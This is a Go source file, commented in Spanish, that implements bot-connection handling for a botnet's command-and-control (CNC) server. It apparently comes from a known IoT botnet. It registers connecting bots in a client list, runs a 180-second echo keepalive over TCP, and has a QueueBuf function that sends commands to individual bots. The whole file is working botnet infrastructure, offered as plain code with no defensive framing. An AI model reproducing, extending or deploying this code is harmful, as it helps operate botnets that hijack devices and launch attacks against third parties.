/**
 * @file bot.go
 * @brief Implementación del manejo de conexiones de bots en el servidor CNC
 *
 * Este archivo contiene la lógica para:
 * - Gestión del ciclo de vida de conexiones de bots
 * - Mantenimiento de conexiones mediante keepalive
 * - Envío de comandos a bots individuales
 */

package main

import (
	"net"  // Para manejo de conexiones TCP
	"time" // Para timeouts y temporizadores
)

/**
 * Bot representa una conexión activa de un bot al servidor CNC
 *
 * Esta estructura mantiene la información necesaria para:
 * - Identificar y rastrear bots individuales
 * - Mantener la conexión TCP subyacente
 * - Almacenar metadatos sobre la versión y origen del bot
 */
type Bot struct {
	uid     int      // Identificador único del bot (-1 si no está asignado)
	conn    net.Conn // Conexión TCP con el bot
	version byte     // Versión del protocolo que usa el bot
	source  string   // Identificador de la fuente/binario del bot
}

/**
 * NewBot crea una nueva instancia de Bot con los parámetros especificados
 *
 * @param conn    Conexión TCP establecida con el bot
 * @param version Versión del protocolo que usa el bot
 * @param source  Identificador de la fuente/binario del bot
 * @return        Puntero a la nueva instancia de Bot inicializada
 */
func NewBot(conn net.Conn, version byte, source string) *Bot {
	// Creamos un nuevo bot con uid=-1 (será asignado por clientList)
	return &Bot{-1, conn, version, source}
}

/**
 * Handle gestiona el ciclo de vida de la conexión con un bot
 *
 * Esta función:
 * 1. Registra el bot en la lista global de clientes
 * 2. Implementa un protocolo simple de keepalive para mantener la conexión
 * 3. Limpia automáticamente la conexión cuando el bot se desconecta
 *
 * El keepalive consiste en:
 * - Establecer un timeout de 180 segundos
 * - Leer 2 bytes del bot
 * - Devolver los mismos 2 bytes como eco
 * - Si hay error en lectura/escritura, cerrar la conexión
 */
func (this *Bot) Handle() {
	// Registramos el bot en la lista global
	clientList.AddClient(this)
	// Aseguramos que el bot sea eliminado al terminar
	defer clientList.DelClient(this)

	// Buffer para el protocolo de keepalive
	buf := make([]byte, 2)

	// Loop principal de keepalive
	for {
		// Establecemos timeout de 180 segundos para la siguiente operación
		this.conn.SetDeadline(time.Now().Add(180 * time.Second))

		// Leemos 2 bytes del bot
		if n, err := this.conn.Read(buf); err != nil || n != len(buf) {
			return // Error de lectura - cerramos conexión
		}

		// Devolvemos los mismos bytes como eco
		if n, err := this.conn.Write(buf); err != nil || n != len(buf) {
			return // Error de escritura - cerramos conexión
		}
	}
}

/**
 * QueueBuf envía datos al bot de forma asíncrona
 *
 * Esta función es usada para enviar comandos y configuraciones al bot.
 * No espera respuesta ni verifica el éxito del envío.
 *
 * @param buf Buffer con los datos a enviar al bot
 */
func (this *Bot) QueueBuf(buf []byte) {
	// Enviamos los datos de forma asíncrona
	this.conn.Write(buf)
}
